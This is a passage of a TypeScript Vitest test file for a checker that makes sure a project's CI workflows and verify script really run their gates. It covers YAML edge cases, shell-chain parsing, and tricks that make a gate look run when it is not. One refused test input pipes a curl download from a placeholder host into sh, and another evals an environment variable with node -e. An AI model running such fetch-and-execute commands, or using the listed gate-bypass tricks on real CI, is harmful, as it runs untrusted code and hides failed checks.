    it.each([
      { shape: 'YAML 1.1’s yes', written: 'yes' },
      { shape: 'a GitHub expression', written: '${{ github.event_name == \'push\' }}' },
      { shape: 'an empty value', written: "''" },
    ])('refuses a continue-on-error it cannot resolve: $shape', ({ written }) => {
      // "I could not read it" and "it said false" are not the same answer, and
      // the old comparison collapsed them: everything that was not the five
      // bytes `true` was treated as a step that gates. A value this reader
      // cannot resolve is a step whose failure it cannot say anything about.
      expect(probe('      - run: pnpm test', `        continue-on-error: ${written}`)).toThrow(
        'cannot resolve to true or false',
      );
    });

    it.each([
      { spelling: 'true' },
      { spelling: 'True' },
      { spelling: 'TRUE' },
    ])('refuses a job whose failure does not fail the run, written $spelling — round two', ({ spelling }) => {
      // Defect fifteen. The step-level twin above was refused by name with an
      // argument for why it must be, and the identical key at JOB level was
      // listed in JOB_KEYS as known and read nowhere. On `static` it takes
      // `pnpm typecheck`, `cargo fmt --all --check` and `cargo clippy` out of
      // the set of things that can fail CI, and it was 141/141 green.
      const text = [
        'jobs:',
        '  probe:',
        '    runs-on: ubuntu-latest',
        `    continue-on-error: ${spelling}`,
        '    steps:',
        '      - run: pnpm typecheck',
      ].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow(
        'no gate in "probe" can fail it either',
      );
    });

    it('reads a job that says its failure does fail the run', () => {
      // The control for the three above.
      const text = [
        'jobs:',
        '  probe:',
        '    runs-on: ubuntu-latest',
        '    continue-on-error: false',
        '    steps:',
        '      - run: pnpm typecheck',
      ].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).not.toThrow();
    });

    it('refuses a YAML anchor', () => {
      expect(probe('      - run: &base pnpm test')).toThrow('an anchor, alias or tag');
    });

    it('refuses a tab in the indentation', () => {
      expect(probe('      - run: pnpm test', '\t\tname: tabbed')).toThrow('a tab');
    });

    it('refuses a second YAML document in one file', () => {
      const text = ['jobs:', '  probe:', '    runs-on: ubuntu-latest', '    steps:', '      - run: pnpm test', '---', 'jobs: {}'].join('\n');
      expect(() => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS)).toThrow('a document separator');
    });

    it('refuses a document with anything left unread after it', () => {
      // The totality net, and it is a *backstop*, not the main defence: a
      // mapping rooted at column zero — which every workflow is — can only
      // consume to the end of the file or refuse, so the net cannot fire on
      // one. It fires on a document whose root node ends early, and it exists
      // so that "the parser walked past something" is a failure rather than a
      // quiet subset. Stated rather than assumed, because a net nobody can trip
      // is a net nobody should count on.
      expect(() => parseWorkflowYaml('probe.yml', '- a: 1\nb: c\n')).toThrow('was left unread');
    });

    it('refuses a file with no jobs: key', () => {
      expect(() => modelOf({ file: 'probe.yml', text: 'name: nothing\n' }, PROBE_READ_WORKFLOWS)).toThrow(
        'has no "jobs:" mapping',
      );
    });

    it('reads a steps: sequence written at the key’s own indent', () => {
      // Legal YAML that a stricter reader would skip in silence. Asserted rather
      // than assumed, because "found no steps" and "there are no steps" are the
      // two outcomes this whole file exists to keep apart.
      const text = ['jobs:', '  probe:', '    runs-on: ubuntu-latest', '    steps:', '    - run: pnpm test'].join('\n');
      expect(modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS).jobs[0]?.steps[0]?.run).toBe('pnpm test');
    });

    it('reads a run: whose value is written on the next line', () => {
      // The `uses:` half of this spelling was defect three. The `run:` half was
      // never separately probed, and a line reader misses it the same way.
      const model = probe('      - run:', '          pnpm probe-unlisted-gate')();
      expect(model.jobs[0]?.commands).toEqual([
        { text: 'pnpm probe-unlisted-gate', gating: true, reached: true },
      ]);
    });

    it('reads a key written with a space before its colon', () => {
      // Ordinary YAML, and one more position along the line that nothing had
      // varied. `run : x` is the key `run`.
      expect(probe('      - run : pnpm probe-unlisted-gate')().jobs[0]?.commands).toEqual([
        { text: 'pnpm probe-unlisted-gate', gating: true, reached: true },
      ]);
    });

    it('refuses a step key that differs from a known one only in case', () => {
      // `RUN:` is not `run:` to the runner either, so a step spelled this way
      // runs nothing — but a reader that lower-cased keys to be helpful would
      // report a gate that does not exist. Refused, and named.
      expect(probe('      - RUN: pnpm probe-unlisted-gate')).toThrow(
        'has a step key this reader does not know: "RUN"',
      );
    });

    it('reads a run: block scalar as the commands it contains', () => {
      const model = probe(
        '      - run: |',
        '          sudo apt-get update',
        '          sudo apt-get install -y \\',
        '            libssl-dev',
      )();
      // The gating flags are asserted here rather than only in the workflow,
      // because this is where they are produced: a newline ends the chain, so
      // only the last line of a block scalar is read as able to fail the job.
      expect(model.jobs[0]?.commands).toEqual([
        { text: 'sudo apt-get update', gating: false, reached: true },
        { text: 'sudo apt-get install -y libssl-dev', gating: true, reached: true },
      ]);
    });
  });

  describe('a key that decides whether the run happens at all', () => {
    /** A whole workflow document: the lines given, then one ordinary job. */
    const document = (...lines: readonly string[]): (() => WorkflowModel) => {
      const text = [
        ...lines,
        'jobs:',
        '  probe:',
        '    runs-on: ubuntu-latest',
        '    steps:',
        '      - run: pnpm probe',
      ].join('\n');
      return () => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS);
    };

    it('reads the events a workflow runs on — defect twenty-five', () => {
      // The parse is asserted separately from the refusals, for the reason
      // `usesTargetOf` exists: "it threw" is also what a reader that understood
      // nothing would report.
      expect(document('on:', '  push:', '    branches: [main]', '  workflow_dispatch:')().triggers).toEqual([
        'push branches: [main]',
        'workflow_dispatch',
      ]);
    });

    it.each([
      { filter: "    paths-ignore: ['**']", named: 'paths-ignore' },
      { filter: "    paths: ['src/**']", named: '"paths"' },
      { filter: '    branches-ignore: [main]', named: '"branches-ignore"' },
    ])('refuses a trigger filtered on $named — defect twenty-five', ({ filter, named }) => {
      // Measured on the tree that shipped after round four, twice:
      // `paths-ignore: ['**']` under both `push:` and `pull_request:` in the
      // real `ci.yml` — every gate byte-identical — was `181 passed (181)`,
      // exit 0. The parser read the line correctly and the model dropped it.
      expect(document('on:', '  push:', filter)).toThrow(named);
    });

    it('refuses an event it has not been told about — defect twenty-five', () => {
      expect(document('on:', '  schedule:', "    - cron: '0 0 * * *'")).toThrow('"schedule"');
    });

    it('a needs: naming no job takes the whole workflow out of CI — defect twenty-six', () => {
      // Renaming this repository's `static:` job and leaving its three
      // `needs: static` lines alone makes GitHub reject the entire file, so no
      // job in it runs on any event. Measured on the tree that shipped after
      // round four, twice: `181 passed (181)`, exit 0.
      expect(
        document('on:', '  push:', '    branches: [main]'),
      ).not.toThrow();

      const twoJobs = (needs: string): (() => WorkflowModel) => {
        const text = [
          'jobs:',
          '  first:',
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - run: pnpm first',
          '  second:',
          `    needs: ${needs}`,
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - run: pnpm second',
        ].join('\n');
        return () => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS);
      };

      expect(twoJobs('first')).not.toThrow();
      expect(twoJobs('[first]')).not.toThrow();
      expect(twoJobs('firsts')).toThrow('needing "firsts"');
      expect(twoJobs('[first, third]')).toThrow('needing "third"');

      // A job with no `needs:` at all needs nothing — the branch every job in
      // this repository's `ci.yml` except three takes.
      expect(needsNamesOf(undefined)).toEqual([]);

      // The third spelling the runner accepts is a block sequence of plain
      // scalars, and it never reaches `needsNamesOf`: this parser refuses it
      // first. Asserted rather than assumed, because "the parser refuses it" is
      // the whole reason that branch is not written.
      const blockSequence = (): unknown =>
        parseWorkflowYaml('probe.yml', ['needs:', '  - first', '  - second'].join('\n'));
      expect(blockSequence).toThrow('is at mapping depth but is not a key this reader can read');
    });

    it.each([
      { scope: 'workflow', lines: ['env:', '  INPUT_REPOSITORY: other-org/not-this-repo'] },
      {
        scope: 'job',
        lines: [
          'jobs:',
          '  probe:',
          '    runs-on: ubuntu-latest',
          '    env:',
          "      INPUT_RUN_INSTALL: 'recursive'",
          '    steps:',
          '      - run: pnpm probe',
        ],
      },
      {
        scope: 'step',
        lines: [
          'jobs:',
          '  probe:',
          '    runs-on: ubuntu-latest',
          '    steps:',
          '      - run: pnpm probe',
          '        env:',
          '          INPUT_REF: probe-branch',
        ],
      },
      {
        scope: 'job, spelled in lower case',
        lines: [
          'jobs:',
          '  probe:',
          '    runs-on: ubuntu-latest',
          '    env:',
          "      input_run_install: 'recursive'",
          '    steps:',
          '      - run: pnpm probe',
        ],
      },
    ])('refuses an INPUT_ env: at $scope scope — defect twenty-seven', ({ scope, lines }) => {
      // Round four's finding and round five's adversary's re-measurement. The
      // step-level refusal has been in place since round four and only ever saw
      // an `env:` sharing a mapping with a `uses:`; GitHub merges the two outer
      // scopes into every step. Measured on the tree that shipped after round
      // four, twice each: workflow-level `INPUT_REPOSITORY` and job-level
      // `INPUT_RUN_INSTALL` were both `181 passed (181)`, exit 0, while the same
      // two lines on a `uses:` step were `no tests`, exit 1.
      const run =
        scope === 'workflow'
          ? document(...lines)
          : () => modelOf({ file: 'probe.yml', text: lines.join('\n') }, PROBE_READ_WORKFLOWS);
      expect(run).toThrow('in an "env:" block');
    });

    it('does not refuse an ordinary env: at any scope — the control', () => {
      // Without this the three rows above pass for a reader that refuses every
      // `env:`, and the real `ci.yml` — which carries a workflow-level block —
      // would take this file down at module load.
      expect(
        document('env:', '  CARGO_TERM_COLOR: always', "  DO_NOT_TRACK: '1'"),
      ).not.toThrow();
    });

    it('resolves continue-on-error from a plain scalar, not from its text — defect twenty-four', () => {
      // `yamlBoolean`'s own doc said a quoted `"true"` was a value it returns
      // `undefined` for, and that was false about the code it shipped in:
      // `parseWorkflowYaml` strips the quotes in its value reader, so the
      // resolver never saw them. Measured on the tree that shipped after round
      // four, twice each: `continue-on-error: 'false'` on the `static` job was
      // `181 passed (181)` exit 0 and `'true'` was `no tests` exit 1 — the
      // quoted spellings resolving exactly like the plain ones. The unsafe half
      // is `'false'`, which took the allow-branch on a fact nobody established.
      const valueOf = (written: string): YamlNode | undefined => {
        const root = parseWorkflowYaml('probe.yml', `probe: ${written}`);
        return root.kind === 'mapping' ? entry(root.entries, 'probe') : undefined;
      };

      // The parse, asserted before the resolution: the quotes really are gone by
      // the time anything asks what the value means.
      expect(scalarOf(valueOf("'false'"))).toBe('false');
      expect(yamlBooleanOf(valueOf("'false'"))).toBeUndefined();
      expect(yamlBooleanOf(valueOf('"true"'))).toBeUndefined();
      expect(yamlBooleanOf(valueOf('false'))).toBe(false);
      expect(yamlBooleanOf(valueOf('False'))).toBe(false);
      expect(yamlBooleanOf(valueOf('TRUE'))).toBe(true);
      expect(yamlBooleanOf(valueOf('on'))).toBeUndefined();

      const suppressed = (written: string): (() => WorkflowModel) => {
        const text = [
          'jobs:',
          '  probe:',
          '    runs-on: ubuntu-latest',
          `    continue-on-error: ${written}`,
          '    steps:',
          '      - run: pnpm probe',
        ].join('\n');
        return () => modelOf({ file: 'probe.yml', text }, PROBE_READ_WORKFLOWS);
      };
      expect(suppressed("'false'")).toThrow('cannot resolve to true or false');
      expect(suppressed("'true'")).toThrow('cannot resolve to true or false');
      expect(suppressed('true')).toThrow('cannot fail the workflow run');
      expect(suppressed('false')).not.toThrow();
    });
  });
});

/* -------------------------------------------------------------------------- */
/* the enumeration, wired to the reader that depends on it                    */
/* -------------------------------------------------------------------------- */

describe('a local uses: is judged against the files the enumeration really read', () => {
  // Defect ten's lesson, applied before it costs anything: *the rule being
  // testable is not the wiring being testable*. Every `uses:` case above hands
  // `modelOf` a set assembled by hand, so all of them stay green under a
  // `readWorkflowSurface` that passes the wrong set. Re-measured on the tree
  // this comment ships in, twice each, exit 1 twice each: replacing the
  // enumeration with `new Set<string>()` is `1 failed | 195 passed (196)`, and
  // the one red is the first case here — that mutation is invisible to every
  // other case in the file. Dropping the membership test so that any `./` path
  // is admitted is `18 failed | 178 passed (196)`, and the second case here is
  // ONE of those eighteen: the other SEVENTEEN are hand-set `uses:` cases above
  // — 3 in *a key is a key whatever its quoting — defect four* and 14 in *a
  // uses: is refused on what it names, not on how it is written* — which is
  // 17 + 1 = 18, read off the failure names of that run. Two earlier versions of
  // this sentence were wrong about this same measurement, and both are worth
  // recording because the shape repeated: the first said "neither mutation is
  // visible to any case above", which was true of the first mutation and false
  // of the second; the second said "the other sixteen", which did not add up to
  // the eighteen the same sentence reports.
  //
  // These two run the real `readWorkflowSurface` over a real directory, which is
  // why they build one rather than mocking `node:fs`: a mock would be a third
  // hand-made set.

  function inTemporaryRepository(
    files: Readonly<Record<string, string>>,
    body: (root: string) => void,
  ): void {
    const root = mkdtempSync(join(tmpdir(), 'verify-covers-ci-'));
    try {
      mkdirSync(join(root, ...WORKFLOW_DIRECTORY), { recursive: true });
      for (const [name, text] of Object.entries(files)) {
        writeFileSync(join(root, ...WORKFLOW_DIRECTORY, name), text);
      }
      body(root);
    } finally {
      rmSync(root, { recursive: true, force: true });
    }
  }

  /** A workflow whose only job is a call to a local reusable workflow. */
  const callerOf = (target: string): string =>
    ['jobs:', '  call:', `    uses: ./.github/workflows/${target}`].join('\n');

  /** The callee: one real gate, so its arrival in the model is observable. */
  const CALLEE = [
    'jobs:',
    '  gate:',
    '    runs-on: ubuntu-latest',
    '    steps:',
    '      - run: pnpm typecheck',
  ].join('\n');

  it('admits the call when the directory really contains the target', () => {
    inTemporaryRepository({ 'main.yml': callerOf('helper.yml'), 'helper.yml': CALLEE }, (root) => {
      const surface = readWorkflowSurface(root);
      expect(surface.files).toEqual(['helper.yml', 'main.yml']);
      // Not just "it did not throw": the allow-branch's justification is that
      // the target's own jobs are already in the model, so that is what is
      // asserted. The callee's gate is here, under the callee's own name.
      expect(surface.models.flatMap((model) => model.jobs).flatMap((job) => job.commands)).toEqual([
        { text: 'pnpm typecheck', gating: true, reached: true },
      ]);
      expect(surface.models.flatMap((model) => model.jobs).map((job) => `${job.file}:${job.name}`)).toEqual([
        'helper.yml:gate',
        'main.yml:call',
      ]);
    });
  });

  it('refuses the identical call when the target is not a file it read', () => {
    inTemporaryRepository({ 'main.yml': callerOf('missing.yml') }, (root) => {
      expect(() => readWorkflowSurface(root)).toThrow(
        'has a "uses:" this reader cannot place: "./.github/workflows/missing.yml"',
      );
    });
  });
});

/* -------------------------------------------------------------------------- */
/* commands, read as shell                                                    */
/* -------------------------------------------------------------------------- */

describe('a command line is read as the commands it runs', () => {
  const texts = (source: string): string[] => shellCommands(source, 'probe').map((c) => c.text);
  const gating = (source: string): string[] =>
    shellCommands(source, 'probe')
      .filter((c) => c.gating)
      .map((c) => c.text);
  const reached = (source: string): string[] =>
    shellCommands(source, 'probe')
      .filter((c) => c.reached)
      .map((c) => c.text);

  it('splits a && chain into its simple commands — defect five', () => {
    // `pnpm install --frozen-lockfile && pnpm probe-smuggled-gate` was 42/42
    // green three times over, because the exemption asked whether the command
    // *began* with setup and never whether it was *only* setup.
    expect(texts('pnpm install --frozen-lockfile && pnpm probe-smuggled-gate')).toEqual([
      'pnpm install --frozen-lockfile',
      'pnpm probe-smuggled-gate',
    ]);
  });

  it('splits the command a backslash continuation rejoins', () => {
    // The second spelling of defect five, and the one a YAML parser does not
    // touch: the parser hands back one correct scalar and the hole is here.
    expect(
      texts('sudo apt-get install -y \\\n  libssl-dev libsecret-1-dev \\\n  && ./scripts/probe.sh'),
    ).toEqual(['sudo apt-get install -y libssl-dev libsecret-1-dev', './scripts/probe.sh']);
  });

  it.each([
    { shape: 'a && b', source: 'a && b', expected: ['a', 'b'] },
    { shape: 'a || b', source: 'a || b', expected: ['b'] },
    { shape: 'a && b || c', source: 'a && b || c', expected: ['c'] },
    { shape: 'a && b || c && d', source: 'a && b || c && d', expected: ['c', 'd'] },
    { shape: 'a ; b', source: 'a ; b', expected: ['b'] },
    { shape: 'a | b', source: 'a | b', expected: ['b'] },
    { shape: 'a\\nb', source: 'a\nb', expected: ['b'] },
  ])('knows which commands in $shape can fail the run', ({ source, expected }) => {
    // Defect six's other half. `a && b || c` is `((a && b) || c)`: if `a` fails
    // the `||` catches it, so neither `a` nor `b` can fail the run. This is why
    // wrapping one flaky gate in `|| echo` takes the gates in front of it out
    // of the chain too, and why the message for that case says so.
    expect(gating(source)).toEqual(expected);
  });

  it.each([
    { shape: 'a && b', source: 'a && b', expected: ['a', 'b'] },
    { shape: 'a || b', source: 'a || b', expected: ['a'] },
    { shape: 'a || b && c', source: 'a || b && c', expected: ['a', 'c'] },
    { shape: 'a && b || c', source: 'a && b || c', expected: ['a', 'b'] },
    { shape: 'a || b || c', source: 'a || b || c', expected: ['a'] },
    { shape: 'a || b ; c', source: 'a || b ; c', expected: ['a', 'c'] },
    { shape: 'a | b', source: 'a | b', expected: ['a', 'b'] },
  ])('knows which commands in $shape a green run executes', ({ source, expected }) => {
    // Defect twelve, and the reason it is a second table rather than a column
    // of the first. `a && b`: `b` is skipped when `a` fails, and that run is
    // RED, so nothing is hidden — `b` is reached. `a || b`: `b` is skipped when
    // `a` succeeds, and that run is GREEN, so a gate written there is one this
    // file would report as run when it was not.
    //
    // `a || b && c` is `((a || b) && c)`: `c` runs on both green readings, so
    // only the first command after a `||` is conditional. `a || b ; c` starts a
    // new list at the `;`, so `c` is unconditional again.
    expect(reached(source)).toEqual(expected);
  });

  it.each([
    { construct: 'a subshell', source: 'a && (b || c)', names: 'a subshell or group' },
    { construct: 'a command substitution', source: 'a $(b)', names: 'a command substitution' },
    { construct: 'a backtick substitution', source: 'a `b`', names: 'a command substitution' },
    { construct: 'a background job', source: 'a & b', names: 'a background job' },
    { construct: 'a shell expansion', source: 'a $B', names: 'a shell expansion' },
  ])('refuses $construct rather than guessing what it runs', ({ source, names }) => {
    // Refusal, not a best guess. Each of these can put a command into the run
    // whose text is not in the file, and this reader's one job is never to
    // report a clean read of something it did not read.
    expect(() => shellCommands(source, 'probe')).toThrow(names);
  });

  it('reads text inside quotes as an argument, never as a command', () => {
    // Defect six in one line. `echo "… pnpm typecheck …"` used to satisfy the
    // typecheck gate. It is one command whose program is `echo`.
    const commands = shellCommands('echo "pnpm typecheck && pnpm build"', 'probe');
    expect(commands.map((c) => c.text)).toHaveLength(1);
    expect(parseCommand(commands[0]?.text ?? '').program).toBe('echo');
  });
});

describe('verify is read as commands that execute, not as text that mentions them', () => {
  it('follows a pnpm script invocation into the script it invokes', () => {
    // The chain is real: `cargo fmt --all --check` is nowhere in `verify`'s own
    // body and reaches it through `pnpm lint:rust`.
    expect(
      VERIFY_CHAIN.some((entry) => entry.gating && invokes(entry.command, 'cargo', 'fmt', '--all', '--check')),
      'verify -> lint:rust -> cargo fmt is the expansion this test is about',
    ).toBe(true);
    expect(VERIFY_CHAIN.some((entry) => entry.script === 'lint:rust')).toBe(true);
  });

  it.each([
    { program: 'echo', text: 'echo "pnpm typecheck"' },
    { program: 'echo', text: 'echo pnpm typecheck' },
  ])('does not read $program’s arguments as an invocation', ({ text }) => {
    // Both spellings. The quoted one is the construction that was measured
    // 42/42 green; the unquoted one is what a second agent would reach for once
    // the quoted one stopped working, and it is the reason the fix cannot be
    // "strip quoted spans".
    expect(pnpmScript(parseCommand(text))).toBeUndefined();
    expect(CI_GATES.every(({ runs }) => !runs(parseCommand(text)))).toBe(true);
  });

  it('does not read a gate name in a script body as an invocation of it', () => {
    // The whole of defect six, driven through the real expander against a
    // synthetic package.json shape.
    const chain = chainOf('probe', {
      probe: 'echo "CI still runs: pnpm typecheck pnpm lint:rust cargo test --workspace --locked"',
      typecheck: 'tsc --build --force',
      'lint:rust': 'cd src-tauri && cargo fmt --all --check',
    });
    expect(chain.map((entry) => entry.command.text)).toEqual([
      'echo "CI still runs: pnpm typecheck pnpm lint:rust cargo test --workspace --locked"',
    ]);
    expect(CI_GATES.filter(({ runs }) => chain.some((e) => e.gating && runs(e.command)))).toEqual([]);
  });

  it('marks a gate whose failure is caught as reached but not gating', () => {
    const chain = chainOf('probe', {
      probe: 'pnpm test:harness || echo "flaky here" && pnpm build',
      'test:harness': 'vitest run',
      build: 'vite build',
    });
    expect(chain.filter((e) => e.gating).map((e) => e.command.text)).not.toContain('pnpm test:harness');
    expect(chain.some((e) => !e.gating && e.command.text === 'pnpm test:harness')).toBe(true);
  });

  it('stops following a script chain that refers back to itself', () => {
    expect(chainOf('a', { a: 'pnpm b', b: 'pnpm a' }).map((e) => e.command.text)).toEqual([
      'pnpm b',
      'pnpm a',
    ]);
  });

  it.each([
    { neutered: 'cargo test --workspace --locked --no-run' },
    { neutered: 'pnpm test --passWithNoTests' },
    { neutered: 'pnpm test:harness --reporter=dot --passWithNoTests' },
    { neutered: 'node scripts/run-bash.mjs scripts/secret-scan.sh --dry-run' },
  ])('does not accept $neutered as the gate it starts with', ({ neutered }) => {
    // The route out of this fix that a leading-argument test would have left
    // open, and the reason {@link invokes} and {@link runsPnpm} are exact. Each
    // of these still *contains* its gate and still *begins* with it; none of
    // them still runs it. There is no reading of the string that separates a
    // strengthening flag from an emptying one, so the row reddens and a person
    // decides.
    const command = parseCommand(neutered);
    expect(CI_GATES.filter(({ runs }) => runs(command))).toEqual([]);
  });

  it('accepts the unflagged form of each of those', () => {
    // The control. Without it the case above passes for a matcher that accepts
    // nothing at all.
    for (const exact of [
      'cargo test --workspace --locked',
      'pnpm test',
      'pnpm test:harness',
      'node scripts/run-bash.mjs scripts/secret-scan.sh',
    ]) {
      expect(
        CI_GATES.some(({ runs }) => runs(parseCommand(exact))),
        `"${exact}" is a gate this file must still recognise`,
      ).toBe(true);
    }
  });

  it('does not exempt a command that merely begins with a setup command', () => {
    // Defect five, asked of the exemption directly rather than through the real
    // workflow. The tree contains no such command, so a code change here is
    // invisible to every other case in this file — which is exactly how a
    // prefix test survived three rounds of review.
    const one = (command: string): WorkflowCommand[] => [
      { file: 'probe.yml', job: 'probe', command, gating: true, reached: true },
    ];

    expect(unaccounted(one('pnpm install --frozen-lockfile && pnpm probe-smuggled-gate'))).toEqual([
      'probe.yml:probe: pnpm install --frozen-lockfile && pnpm probe-smuggled-gate',
    ]);
    expect(unaccounted(one('cargo test --workspace --locked --no-run'))).toEqual([
      'probe.yml:probe: cargo test --workspace --locked --no-run',
    ]);

    // The controls, without which the two rows above pass for a filter that
    // exempts nothing at all.
    expect(unaccounted(one('pnpm install --frozen-lockfile'))).toEqual([]);
    expect(unaccounted(one('cargo test --workspace --locked'))).toEqual([]);
  });

  it('a gate row is checked against itself — defect seven', () => {
    // The real list is consistent, so this rule is invisible to every other case
    // in this file unless it is asked about rows the tree does not contain.
    const ok: CiGate = { ci: 'pnpm test', runs: (c) => runsPnpm(c, 'test') };
    expect(rowDrift(ok, [ok])).toEqual([]);

    // The measured escape: CI's command was strengthened, the `ci` string was
    // updated because `unaccounted` forces it, and `runs` still describes the
    // command CI stopped running.
    const drifted: CiGate = {
      ci: 'cargo build --workspace --locked --all-targets',
      runs: (c) => invokes(c, 'cargo', 'build', '--workspace', '--locked'),
    };
    expect(rowDrift(drifted, [drifted])).toHaveLength(1);
    expect(rowDrift(drifted, [drifted])[0]).toContain('drifted apart');
  });

  it('a wrapper row has to earn its exemption — defect seven', () => {
    const inner: CiGate = { ci: 'pnpm test:harness', runs: (c) => runsPnpm(c, 'test:harness') };
    const wrapper: CiGate = {
      ci: 'node scripts/ci-retry-vitest-crash.mjs pnpm test:harness',
      runs: (c) => runsPnpm(c, 'test:harness'),
      delegatesTo: 'pnpm test:harness',
    };
    expect(rowDrift(wrapper, [inner, wrapper])).toEqual([]);

    // Without the inner row listed, the delegation points at a gate nothing
    // checks — which is how a wrapper would become the only record of a gate.
    expect(rowDrift(wrapper, [wrapper])).toHaveLength(1);
    expect(rowDrift(wrapper, [wrapper])[0]).toContain('not itself a listed gate');

    // `delegatesTo` is not a way to switch the check off: a row whose predicate
    // already accepts its own `ci` does not need one, and is told to delete it.
    const needless: CiGate = { ...inner, delegatesTo: 'pnpm test:harness' };
    expect(rowDrift(needless, [inner, needless])).toHaveLength(1);
    expect(rowDrift(needless, [inner, needless])[0]).toContain('exemption is not needed');

    // And a predicate that describes neither half is caught rather than excused.
    const neither: CiGate = { ...wrapper, runs: (c) => runsPnpm(c, 'build') };
    expect(rowDrift(neither, [inner, neither])).toEqual([
      expect.stringContaining('does not accept that command either'),
    ]);
  });

  it('a gate that cannot fail, or that does not run, is caught — defects ten and twelve', () => {
    // Asked of the rule directly. `ci.yml` contains no suppressed gate, so with
    // this rule written inline it asserted nothing about itself: dropping the
    // `gating` flag on the way into COMMANDS — which is defect ten put straight
    // back — was 115/115 green, twice, on the tree of 115 that carried it, and
    // only reddened once a
    // mutated `ci.yml` supplied the input the tree does not have.
    const gates: CiGate[] = [{ ci: 'pnpm test', runs: (c) => runsPnpm(c, 'test') }];
    const at = (command: string, gating: boolean, reached = true): WorkflowCommand[] => [
      { file: 'probe.yml', job: 'probe', command, gating, reached },
    ];

    expect(unenforcedGates(at('pnpm test', false), gates)).toEqual([
      'probe.yml:probe: pnpm test (its failure cannot fail the job)',
    ]);

    // Defect twelve, the other side of the same `||`. Its exit status is
    // honoured; it only ever runs when the command in front of it failed, so
    // every green run of that step skips it.
    expect(unenforcedGates(at('pnpm test', true, false), gates)).toEqual([
      'probe.yml:probe: pnpm test (runs only if the command in front of it failed)',
    ]);

    // Two controls. A gate that can fail and does run is not reported, or the
    // rule would be satisfied by one that reports everything; and a *non-gate*
    // that cannot fail is not reported either, because setup is allowed to be
    // suppressed and a rule that objected to it would be red on this tree's apt
    // steps.
    expect(unenforcedGates(at('pnpm test', true), gates)).toEqual([]);
    expect(unenforcedGates(at('sudo apt-get update', false), gates)).toEqual([]);
  });

  it('does not accept an invocation it has never been told runs and returns', () => {
    // Defect thirteen, asked of the rule directly. The real chain contains only
    // accepted invocations, so this rule is invisible to every other case in
    // this file unless it is handed a chain the tree does not have — which is
    // how a `verify` side with no totality check at all survived three rounds.
    const chain = (body: string): VerifyCommand[] => chainOf('probe', { probe: body, typecheck: 'tsc --build --force' });

    expect(unclassifiedVerifyCommands(chain('exit 0 && pnpm typecheck'))).toEqual([
      'probe -> exit 0 (no entry names the program "exit")',
    ]);

    // The construction in full: every gate behind the `exit` is real, parsed,
    // gating and reached, so nothing else in this file objects to it.
    const escape = chain('exit 0 && pnpm typecheck');
    expect(escape.some((e) => e.gating && e.reached && runsPnpm(e.command, 'typecheck'))).toBe(true);

    // The control. Without it the rows above pass for a rule that reports every
    // command, and the shipped chain would be red.
    expect(unclassifiedVerifyCommands(chain('pnpm typecheck'))).toEqual([]);
  });

  it.each([
    {
      what: 'pnpm exec, which runs a program nobody here named',
      body: 'pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh"',
      report:
        'probe -> pnpm exec sh -c "curl -s http://example.invalid/gate.sh | sh" (arguments outside every ' +
        'shape listed for "pnpm": pnpm <script in the root package.json> (or "pnpm run <script>"))',
    },
    {
      what: 'node -e, whose text is not a file in this repository',
      body: 'node -e "eval(process.env.PROBE||\'\')"',
      report:
        'probe -> node -e "eval(process.env.PROBE||\'\')" (arguments outside every shape listed for ' +
        '"node": node <path in this repository> [arguments])',
    },
    {
      what: 'pnpm install, which runs whatever the lifecycle keys say',
      body: 'pnpm install --frozen-lockfile',
      report:
        'probe -> pnpm install --frozen-lockfile (arguments outside every shape listed for "pnpm": ' +
        'pnpm <script in the root package.json> (or "pnpm run <script>"))',
    },
    {
      what: 'vitest with no subcommand, which watches instead of returning',
      body: 'vitest',
      report:
        'probe -> vitest (arguments outside every shape listed for "vitest": vitest run [flags or paths ' +
        'in this repository])',
    },
  ])('refuses $what — defect eighteen', ({ body, report }) => {
    // Defect eighteen. Round three's net was a list of seven program NAMES, and
    // its doc said each entry named the fact that what the program runs "is
    // written in this repository" — a property of the invocation, asserted about
    // the token. Every body here has a listed program in the program position.
    // Measured on the tree that shipped after round three, twice each: the
    // first two prefixed to the shipped chain were `172 passed (172)`, exit 0,
    // while the byte-equivalent `sh -c "…"` with `sh` in the program position
    // was `1 failed | 171 passed (172)`, exit 1. One invocation, two spellings,
    // opposite verdicts.
    expect(unclassifiedVerifyCommands(chainOf('probe', { probe: body }))).toEqual([report]);
  });

  it('accepts the argument shapes the shipped chain really uses — the control', () => {
    // Without this the four rows above pass for a rule that refuses everything,
    // and the shipped chain would be red. Each of these is a command that is
    // really in VERIFY_CHAIN, asked of the classifier on its own.
    for (const text of [
      'pnpm typecheck',
      'pnpm run typecheck',
      'node scripts/run-bash.mjs scripts/secret-scan.sh',
      'cargo build --workspace --locked',
      'tsc --build --force',
      'vite build',
      'vitest run',
      'vitest run --config tests/harness/mock-provider/vitest.config.ts',
      'cd src-tauri',
    ]) {
      expect(acceptsInvocation(parseCommand(text)), `"${text}" is in the shipped chain`).toBeDefined();
    }

    // And the referential half of it: `node <path>` is accepted because the path
    // is here, not because it is spelled like one.
    expect(acceptsInvocation(parseCommand('node scripts/no-such-file.mjs'))).toBeUndefined();
    expect(repositoryPath('scripts/run-bash.mjs')).toBe('scripts/run-bash.mjs');
    expect(repositoryPath('../outside/gate.mjs')).toBeUndefined();
    expect(repositoryPath('scripts/no-such-file.mjs')).toBeUndefined();
  });

  it('a pnpm script name behind a cd binds to a manifest nobody read — defect nineteen', () => {
    // Defect nineteen. `chainOf`'s edge is the sentence every row above rests
    // on: "`pnpm typecheck` runs the body of `scripts.typecheck` in the root
    // package.json". `cd` was on round three's allowlist, admitted with a
    // comment saying it "changes what the commands after it do", and the edge
    // was followed anyway. Measured on the tree that shipped after round three,
    // twice: a `verify` of `cd probe && pnpm typecheck && …` beside a
    // probe manifest whose scripts are `node -e ""` was `172 passed
    // (172)`, exit 0, with every gate row satisfied against bodies that do not
    // run — while renaming one of those invocations to a name only `probe`'s
    // manifest declares, which changes nothing about what executes, was
    // `1 failed | 171 passed (172)`, exit 1 twice.
    const chain = chainOf('probe', {
      probe: 'cd src-tauri && pnpm typecheck',
